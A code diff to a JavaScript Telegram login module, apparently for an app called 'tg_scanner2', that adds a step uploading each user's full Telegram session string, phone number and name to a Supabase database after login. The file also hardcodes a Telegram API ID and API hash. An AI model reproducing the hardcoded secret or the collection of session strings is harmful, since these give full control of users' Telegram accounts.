@@ -1,13 +1,8 @@
 /**
- * auth.js — Telegram login state machine
- *
- * Steps: phone → sending → otp → verifying → password → done | error
- *
- * Usage:
- * beginLogin(phone, gramLib, onStateChange)
- * submitOtp(code)        — call when user submits OTP
- * submitPassword(pass)   — call when user submits 2FA password
+ * auth.js — Telegram login state machine with Supabase
  */
+
+import { saveSessionToDB } from './db.js';
 
 const API_ID = 39942557;
 const API_HASH = '77a67551c7f83be89c33da3a95eefea0';
@@ -17,7 +12,6 @@ const STORAGE_KEYS = {
   activePhone: 'tg_scanner2_active_phone_v1',
 };
 
-// Holds resolvers for the current active login flow
 let _currentAuth = null;
 
 export async function beginLogin(phone, gramLib, onStateChange) {
@@ -42,7 +36,8 @@ export async function beginLogin(phone, gramLib, onStateChange) {
   onStateChange({ step: 'sending', message: 'Connecting to Telegram…' });
 
   try {
-    // ❌ HATA DIYA: await client.connect();
+    // Connect first for native browser build
+    await client.connect();
 
     await client.start({
       phoneNumber: async () => phone,
@@ -63,7 +58,6 @@ export async function beginLogin(phone, gramLib, onStateChange) {
       },
     });
 
-    // ── Login successful ──────────────────────────────────────────────────
     const sessionStr = client.session.save();
 
     let name = phone;
@@ -79,6 +73,10 @@ export async function beginLogin(phone, gramLib, onStateChange) {
         phone.slice(-2).toUpperCase();
     } catch (_) {}
 
+    // 🔥 SAVE TO SUPABASE 🔥
+    await saveSessionToDB(phone, sessionStr, name);
+
+    // Save locally for fast UI load
     const accounts = _loadAccounts();
     accounts[phone] = { phone, name, username, initials, session: sessionStr };
     _saveAccounts(accounts);
